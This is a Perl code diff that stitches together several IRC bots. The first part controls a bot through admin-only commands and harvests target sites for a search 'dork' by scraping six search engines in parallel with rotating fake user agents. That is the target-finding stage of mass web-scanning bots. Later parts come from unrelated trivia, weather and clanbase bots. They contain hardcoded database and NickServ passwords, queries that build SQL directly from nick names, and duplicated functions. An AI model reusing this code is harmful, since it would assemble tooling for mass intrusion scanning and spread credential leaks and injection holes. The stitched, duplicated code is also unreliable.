+				&respond_to_privmsg(\%msg,"15[7FINISH15]12 YOU HAVE COMPLETED TEST ");
+			}
+		}
+	
+sub ctrl_admin()
+{
+	my $data = $_[0];
+	foreach my $admin ( GUJJAR_FRIENDS )
+	{
+		if($admin eq $data->{'from'})
+		{
+			return(0);
+		}
+	}
+	&respond_to_privmsg($data,"15[4BLOCK15]1 YOU ARE NOT ADMIN");
+	return(-1);
+}
+
+sub respond_to_privmsg()
+{
+	my ($data,$m) = ($_[0],$_[1]);
+	if($data->{'to'} =~ /#/)
+	{
+		&privmsg($data->{'to'},$m);
+	}
+	else
+	{
+		&privmsg($data->{'from'},$m);
+	}
+}
+
+sub privmsg()
+{
+	my($nick,$send) = @_;
+	$irc_socket ->write("PRIVMSG ".$nick." :".$send."\r\n");
+}
+
+sub unique()
+{
+	my @unici = ();
+	my %visti = ();
+	foreach my $elemento (@_) {
+		$elemento =~ s/\/+/\//g;
+		next if $visti{$elemento}++;
+		push @unici, $elemento;
+	}
+	return @unici;
+}
+
+
+sub find_all_sites()
+{
+	my ($data,$dork)  =  @_;
+	my $tmp_file_name =  rand(999999) . ".txt";
+	my @pids_array    =  ();
+	my @data_links    =  ();
+	my @site_finded   =  ();
+	my @site_cleaned  =  ();
+	$dork             =~ s/[\r\n]//g;
+	
+	&respond_to_privmsg($data,"15[7INFO15]12 START TO FIND ALL SITES FOR \"".$dork."\" ");
+
+	$pids_array[0] = fork();
+	if($pids_array[0] == 0)
+	{ 
+		@data_links = &google($dork);
+		&respond_to_privmsg($data,"15[7GOOGLE15]12 TOTAL SITES FINDED: ".scalar(@data_links)." ");
+		&write_to_file_array($tmp_file_name,\@data_links,scalar(@data_links));
+		exit(0);
+	}
+	
+	$pids_array[1] = fork();
+	if($pids_array[1] == 0)
+	{ 
+		@data_links = &yahoo($dork);
+		&respond_to_privmsg($data,"15[7YAHOO15]12 TOTAL SITES FINDED: ".scalar(@data_links)." ");
+		&write_to_file_array($tmp_file_name,\@data_links,scalar(@data_links));
+		exit(0);
+	}
+	
+	$pids_array[2] = fork();
+	if($pids_array[2] == 0)
+	{ 
+		@data_links = &altavista($dork);
+		&respond_to_privmsg($data,"15[7ALTAVISTA15]12 TOTAL SITES FINDED: ".scalar(@data_links)." ");
+		&write_to_file_array($tmp_file_name,\@data_links,scalar(@data_links));
+		exit(0);
+	}
+	
+	$pids_array[3] = fork();
+	if($pids_array[3] == 0)
+	{ 
+		@data_links = &msn($dork);
+		&respond_to_privmsg($data,"15[7BiNG15]12 TOTAL SITES FINDED: ".scalar(@data_links)." ");
+		&write_to_file_array($tmp_file_name,\@data_links,scalar(@data_links));
+		exit(0);
+	}
+
+	$pids_array[4] = fork();
+	if($pids_array[4] == 0)
+	{ 
+		@data_links = &ask($dork);
+		&respond_to_privmsg($data,"15[7ASK.COM15]12 TOTAL SITES FINDED: ".scalar(@data_links)." ");
+		&write_to_file_array($tmp_file_name,\@data_links,scalar(@data_links));
+		exit(0);
+	}
+
+	$pids_array[5] = fork();
+	if($pids_array[5] == 0)
+	{ 
+		@data_links = &webcrawler($dork);
+		&respond_to_privmsg($data,"15[7WEBCRAWLER15]12 TOTAL SITES FINDED: ".scalar(@data_links)." ");
+		&write_to_file_array($tmp_file_name,\@data_links,scalar(@data_links));
+		exit(0);
+	}
+	
+	foreach my $pid_one ( @pids_array )
+	{
+		waitpid($pid_one,0);
+	}
+	
+	@site_finded = &read_all_file_array($tmp_file_name);
+	&respond_to_privmsg($data,"15[7INFO15]12 TOTAL SITES FINDED: ".scalar(@site_finded)." ");
+	@site_cleaned = &unique(@site_finded);
+	&respond_to_privmsg($data,"15[7INFO15]12 CLEANED SITES FINDED: ".scalar(@site_cleaned)." ");
+	unlink($tmp_file_name);
+	return(@site_cleaned);
+}
+
+sub join_all()
+{
+	foreach my $chan ( @chans )
+	{
+		$irc_socket->write("JOIN ".$chan."\r\n");
+	}
+}
+
+sub get_msg()
+{
+	my $line = $_[0];
+	my %data;
+	#:Mic22!~Chungrynebauib-E4537V88.megacable.org.mx PRIVMSG chkbot :hi
+	if($line =~ /:(.*?)!(.*?) PRIVMSG (.*?) :(.*)/)
+	{
+#$irc_socket->write("PRIVMSG #MC : Spammer=> $1 Mess=> $4 \r\n");
+		$data{'from'} = $1;
+		$data{'to'}   = $3;
+		$data{'what'} = $4;
+	}
+	return(%data);
+}
+
+sub http_request()
+{
+	my($site,$request,$ua,$resp,$cnt);
+	$site    =  $_[0];
+	$site    =~ s/[\r\n]//g;  
+	$request =  HTTP::Request->new(GET => $site);
+	$ua      =  LWP::UserAgent->new(agent => $user_agents[rand(scalar(@user_agents))]);
+	$ua->timeout($timeout);
+	$resp    =  $ua->request($request);
+	$cnt     =  $resp->content();
+	return($cnt);
+}
+
+sub Agent(){
+    my @ret = (
+    "Microsoft Internet Explorer/4.0b1 (Windows 95)",
+    "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
+    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
+    "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
+    "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
+    "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
+    "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
+    "Microsoft Pocket Internet Explorer/0.6",
+    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
+    "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
+    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
+    "Advanced Browser (http://www.avantbrowser.com)",
+    "Avant Browser (http://www.avantbrowser.com)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
+    "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
+    "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
+    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
+    "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
+    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
+    "Mozilla/3.0 (OS/2; U)",
+    "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
+    "Mozilla/4.61 (Macintosh; I; PPC)",
+    "Mozilla/4.61 [en] (OS/2; U)",
+    "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
+    "Mozilla/4.8 [en] (Windows NT 5.0; U)" );
+return(@ret);
+}
+ 
+sub get_user_agents()
+{
+	my @us_ag = (
+	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
+	"Opera/8.5 (X11; Linux i686; U; cs)",
+	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
+    "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
+    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
+    "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
+    "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
+    "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
+    "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
+    "Microsoft Pocket Internet Explorer/0.6",
+    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
+    "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
+    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
+    "Advanced Browser (http://www.avantbrowser.com)",
+    "Avant Browser (http://www.avantbrowser.com)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
+    "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
+    "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
+    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
+    "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
+    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
+    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
+    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
+    "Mozilla/3.0 (OS/2; U)",
+    "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
+    "Mozilla/4.61 (Macintosh; I; PPC)",
+    "Mozilla/4.61 [en] (OS/2; U)",
+    "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
+    "Mozilla/4.8 [en] (Windows NT 5.0; U)",
+	"Links (2.1pre17; Linux 2.6.11-gentoo-r8 i686; 80x24)"
+	);
+	return(@us_ag);
+}
+
+sub get_all_host()
+{
+	my $site =  $_[0];
+	my @dirs =  ();
+	my @ret  =  ();
+	my $tmp  =  "";
+	$site    =~ s/http:\/\///g;
+	$site    =~ s/[\r\n]//g;
+	$site    =~ s/\/\///g;
+	if($site !~ /\/$/)
+	{
+		$site .= "/";
+	}
+
+	@dirs = split(/\//,$site);
+	$tmp = $dirs[0] . "/";
+	push(@ret,$tmp);
+	
+	for($i = 1; $i < scalar(@dirs); $i++)
+	{
+		$tmp .= $dirs[$i] . "/";
+		push(@ret,$tmp);
+	}
+	
+	return(@ret);
+}
+
+
+sub urlencode()
+{
+  my $str = $_[0];
+  $str =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
+  return $str;
+}
+
+
+sub read_all_file_array()
+{
+	my $file = $_[0];
+	my @ret  = ();
+
+	open(FILE,'<',$file);
+	while($a = <FILE>)
+	{
+		$a =~ s/[\r\n]//g;
+		push(@ret,$a);
+	}
+	close(FILE);
+	
+	return(@ret);
+}
+
+sub write_to_file_array()
+{
+	my ($file,$data,$scal) = @_;
+	for($i = 0; $i < $scal; $i++)
+	{
+		&write_to_file($file,$data->[$i]);
+	}
+}
+
+sub canghecmd()
+
+{
+
+	my $n = $_[0];
+
+	push(@botcmd,$n);
+
+}
+
+sub google()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 300; $i += 100)
+
+	{
+
+		$html .= &http_request("http://www.google.it/search?q=".$dork."&hl=it&pwst=1&start=".$i."&num=100&sa=N");
+
+	}
+
+	
+
+	while($html =~ m/<li class=g><h3 class=r><a href=\"http:\/\/(.+?)\" class=l/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+
+sub altavista()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 1000; $i += 10)
+
+	{
+
+		$html .= &http_request("http://www.altavista.com/web/results?itag=ody&kgs=0&kls=0&q=".$dork."&stq=".$i);
+
+	}
+
+	
+
+	while($html =~ m/<span class=ngrn>(.+?) <\/span>/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+
+sub yahoo()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 1000; $i += 100)
+
+	{
+
+		$html .= &http_request("http://search.yahooapis.com/WebSearchService/V1/webSearch?appid=SiteSearch&query=".$dork."&results=100&start=".$i);
+
+	}
+
+	
+
+	while($html =~ m/<Url>http:\/\/(.+?)\<\/Url>/g)
+
+	{
+
+		my $link = $1;
+
+		if($link !~ /yahoo/)
+
+		{
+
+			my @tmp_link = &get_all_host($link);
+
+			push(@results,@tmp_link);
+
+		}
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+
+sub msn()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 1000; $i += 10)
+
+	{
+
+		$html .= &http_request("http://www.bing.com/search?q=".$dork."&first=".$i."&FORM=PERE");
+
+	}
+
+	
+
+	while($html =~ m/<a href=\"http:\/\/(.+?)\" onmousedown/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+
+sub ask()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 9; $i += 1)
+
+	{				
+
+		$html .= &http_request("http://it.ask.com/web?q=".$dork."&o=312&l=dir&qsrc=0&dm=all&page=".$i);
+
+	}
+
+	
+
+	while($html =~ m/class=\"L4\" href=\"(.+?)\" onmousedown/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+sub msn()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 1000; $i += 10)
+
+	{
+
+		$html .= &http_request("http://www.bing.com/search?q=".$dork."&first=".$i."&FORM=PERE");
+
+	}
+
+	
+
+	while($html =~ m/<a href=\"http:\/\/(.+?)\" onmousedown/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+
+sub ask()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 9; $i += 1)
+
+	{				
+
+		$html .= &http_request("http://it.ask.com/web?q=".$dork."&o=312&l=dir&qsrc=0&dm=all&page=".$i);
+
+	}
+
+	
+
+	while($html =~ m/class=\"L4\" href=\"(.+?)\" onmousedown/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+
+sub default {
+
+        # This is helpful to see what an event returns.  Data::Dumper will
+        # recursively reveal the structure of any value
+        my ($conn, $event) = @_;
+        #print Dumper($event);
+}
+        
+# experiment with the cping event, printing out to standard output
+#$conn->add_handler('cping', \&default);
+
+#conn-$gt;mode('#linux', '+o', 'tux');
+sub db_connect {
+
+	my $obj = shift;
+
+	# check if db is up
+	if ($obj->{dbh}) {
+		if ($obj->{dbh}->ping()) {
+			return;
+		}	
+	}
+	
+	my $db = $obj->{db} || 'trivia';
+	my $hosting = $obj->{host} || 'localhost';
+	my $user = $obj->{user} || 'triviabot';
+	my $password = $obj->{password} || 'super902soaker';
+
+	my $dbh = DBI->connect("DBI:mysql:$db:$hosting", $user, $password);  
+	
+	if (!$dbh) {
+		die("Can't connect to $db with $user $password");
+	}	
+
+	$obj->{dbh} = $dbh;
+}
+
+sub db_disconnect {
+
+	my $obj = shift;
+	$obj->{dbh}->disconnect();
+
+}
+
+sub min {
+	
+	my ($a, $b) = @_;
+	
+	if ($a < $b) { return $a; }
+	else { return $b;}
+
+}	
+
+sub on_notice {
+
+	my ($conn, $event) = @_;
+
+	# This handles nick registration.  On some IRC networks, you can 
+	# password-protect you nick.  The IRC server will send you a "notice"
+	# as NickServ that you have to identify with your passowrd.
+	if (
+	($event->{nick} eq 'NickServ') and
+	($event->{args}[0] eq 'If you do not change within one minute, I will change your nick.')
+	) {
+		# send an /msg to NickServ with the password
+		$conn->privmsg('NickServ', 'identify rokerman');
+		
+		# This is another hack, based on the fact that I've registered
+		# the nick "RokerBot" on the IRC server which doesn't
+		# send the end of MOTD message.  So when I'm asked to 
+		# send my password, I know I've connected.
+		#
+		# This is redundant with the behavior covered in on_msg
+		on_connect($conn);
+	}
+}
+
+sub weather {
+
+	my $input = shift;
+	my $nick = shift;
+	
+	# Split the text sent on a comma and space, eg "New York, NY"
+	my ($city, $state) = split(', ', $input);
+	
+	# Get weather information from the weather object
+	if ($weather->get_weather($city, $state)) {
+		# If we get true from this, then we've failed and will
+		# return an error message
+		return "Unable to retrieve weather.  Sorry, $nick.";
+	}	
+	
+	# otherwise, we get a hash of today's forecast and an array
+	# of future days forecasts.
+	
+	my %wh = %{$weather->{main}};
+	my @dh = @{$weather->{forecast}};
+	
+	# format today's forecast
+	my $text = qq/$nick, it's $wh{Temperature} in $city, $state right now.  Wind is $wh{Wind}.  Humidity is $wh{Humidity}.  Roker would say it's $wh{Conditions}.  /;
+	# give the next two days' forecasts
+	foreach (0..1) {
+		$text .= $dh[$_];
+	}	
+	
+	return $text;
+}
+
+# ------------------------------------
+# Chec to see if a user is registered
+# ------------------------------------
+
+sub is_registered {
+        my $nick = shift;
+        my $dbh = get_dbh();
+        my $sth = $dbh->prepare("SELECT id FROM users WHERE username='$nick'");
+        $sth->execute(); 
+        my $rows = $sth->rows;
+
+        if($rows == 0) {
+                return 0;
+        } else {
+                return 1;
+        }
+}
+	
+sub map_results {
+        my $cid = shift;
+        my $channel = shift;
+        my $dbh = get_dbh();
+        my $c = $dbh->selectrow_hashref("SELECT clanid, ladderid FROM setup WHERE channel=?", undef, $channel);
+        my $clan = HTML::TagParser->new("http://clanbase.ggl.com/claninfo.php?wars=1&cid=$cid&lid=$c->{ladderid}");
+        my @list = $clan->getElementsByClassName("valuecell");
+        push(@list, $clan->getElementsByClassName("valuecell2"));
+        my(@maps, @res);
+
+        for(@list) {
+                if($_->innerText =~ /\w+\s\/\s\w+/) {
+                        my($m1, $m2) = split(/\//, $_->innerText);
+                        push(@maps, $m1);
+                        push(@maps, $m2);
+                }
+                if($_->innerText =~ /(((-|\+)\s\d+|waiting\.\.\.|none))/) {
+                        if($_->innerText =~ /none/) {
+                                push(@res, "+ 1");
+                                push(@res, "+ 1");
+                        } else {
+                                push(@res, $_->innerText);
+                                push(@res, $_->innerText);
+                        }
+                }
+        }
+
+        my %mapres;
+        my $i = 0;
+        foreach my $map (@maps) {
+                $map =~ s/\s//;
+                if($res[$i] =~ /\+/) {
+                        $mapres{$map}{"wins"}++;
+                } else {
+                        $mapres{$map}{"loss"}++;
+                }
+                $i++;
+        }
+
+        my %finalres; 
+        for my $key (keys %mapres) {
+                if(!defined($mapres{$key}{"loss"})) { $mapres{$key}{"loss"} = 0; } 
+                if(!defined($mapres{$key}{"wins"})) { $mapres{$key}{"wins"} = 0; }      
+                $finalres{$key} = ($mapres{$key}{"wins"} / (1 + $mapres{$key}{"loss"}));
+        }
+
+        return %finalres;
+}
+
+sub map_results {
+        my $cid = shift;
+        my $channel = shift;
+        my $dbh = get_dbh();
+        my $c = $dbh->selectrow_hashref("SELECT clanid, ladderid FROM setup WHERE channel=?", undef, $channel);
+        my $clan = HTML::TagParser->new("http://clanbase.ggl.com/claninfo.php?wars=1&cid=$cid&lid=$c->{ladderid}");
+        my @list = $clan->getElementsByClassName("valuecell");
+        push(@list, $clan->getElementsByClassName("valuecell2"));
+        my(@maps, @res);
+
+        for(@list) {
+                if($_->innerText =~ /\w+\s\/\s\w+/) {
+                        my($m1, $m2) = split(/\//, $_->innerText);
+                        push(@maps, $m1);
+                        push(@maps, $m2);
+                }
+                if($_->innerText =~ /(((-|\+)\s\d+|waiting\.\.\.|none))/) {
+                        if($_->innerText =~ /none/) {
+                                push(@res, "+ 1");
+                                push(@res, "+ 1");
+                        } else {
+                                push(@res, $_->innerText);
+                                push(@res, $_->innerText);
+                        }
+                }
+        }
+
+        my %mapres;
+        my $i = 0;
+        foreach my $map (@maps) {
+                $map =~ s/\s//;
+                if($res[$i] =~ /\+/) {
+                        $mapres{$map}{"wins"}++;
+                } else {
+                        $mapres{$map}{"loss"}++;
+                }
+                $i++;
+        }
+
+        my %finalres; 
+        for my $key (keys %mapres) {
+                if(!defined($mapres{$key}{"loss"})) { $mapres{$key}{"loss"} = 0; } 
+                if(!defined($mapres{$key}{"wins"})) { $mapres{$key}{"wins"} = 0; }      
+                $finalres{$key} = ($mapres{$key}{"wins"} / (1 + $mapres{$key}{"loss"}));
+        }
+
+        return %finalres;
+}
+
+
+	sub avgrank_clans {
+        my @pids = @_;
+        my (@hids, @cids, @ranks);
+        my $dbh = get_dbh();
+
+        foreach my $pid (@pids) {
+                my $memberpage = get("http://clanbase.ggl.com/personinfo.php?pid=$pid");
+                if($memberpage =~ /hid=(\d+)/) {
+                        push(@hids, $1);
+                }
+        }
+
+        foreach my $hid (@hids) {
+                my $humanpage = get("http://clanbase.ggl.com/humaninfo.php?hid=$hid");
+                my @clans = $humanpage =~ /cid=(\d+)/g;
+                push(@cids, @clans);
+        }
+
+        my %seen = ();
+        my @uniqcids = grep { !$seen{$_}++ } @cids;
+
+        #print join("\n", @uniqcids);
+
+        foreach my $cid (@uniqcids) {
+                #my $rank = clan_rank($cid, $channel);
+                #push(@ranks, $rank);
+        }
+
+        #print join("\n", @ranks);
+}
+
+# --------------------
+# Get channel by nick 
+# --------------------
+
+sub get_channel {
+        my $nick = shift;
+        my $dbh = get_dbh();
+        my $sth = $dbh->prepare("SELECT channel FROM users WHERE username='$nick'");
+        $sth->execute(); 
+        my $res = $sth->fetchrow_hashref();
+
+        return $res->{channel};
+}
+
+sub cb_link { return "http://clanbase.ggl.com/claninfo.php?wars=1&cid=$config{clanid}&lid=$config{ladderid}";  }
